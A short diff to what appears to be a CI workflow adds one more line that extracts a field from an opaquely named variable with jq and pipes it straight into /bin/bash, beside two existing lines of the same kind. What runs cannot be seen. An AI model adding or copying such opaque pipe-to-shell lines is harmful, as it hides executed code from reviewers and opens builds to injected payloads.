@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$vndl05" | jq -r .jmfy71316 | /bin/bash
           echo $p31 | jq -r .ov3 | /bin/bash
+          echo $wae503 | jq -r .pw2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
